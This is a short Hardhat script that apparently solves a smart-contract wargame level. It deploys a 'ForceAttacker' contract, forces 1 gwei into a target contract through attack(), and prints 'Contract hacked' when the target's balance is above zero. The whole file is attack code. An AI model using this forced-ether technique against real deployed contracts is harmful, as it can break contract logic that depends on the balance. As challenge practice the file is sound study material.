import { ethers } from "hardhat";

const CONTRACT_NAME = "ForceAttacker";
const CONTRACT_ADDRESS = "0xdDa52a4aF136692baF20c3427ee190aF1f20aA0e";

async function hack() {
  const [wallet] = await ethers.getSigners();

  const factory = await ethers.getContractFactory(CONTRACT_NAME);
  const contract = factory.attach(CONTRACT_ADDRESS);

  const factoryAttacker = await ethers.getContractFactory("ForceAttacker");
  const attacker = await factoryAttacker.deploy(contract.address);

  const value = ethers.utils.parseUnits("1", "gwei");
  const txAttacker = await attacker.attack({
    value: value,
    gasLimit: 100000,
  });
  console.log("txAttacker : ", txAttacker.hash);
  await txAttacker.wait();

  const contractBalance = await ethers.provider.getBalance(contract.address);
  console.log("contractBalance : ", contractBalance.toNumber());
  if (contractBalance.toNumber() > 0) console.log("🚀 Contract hacked");
  else console.log("❌ Contract not hacked");
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
hack().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
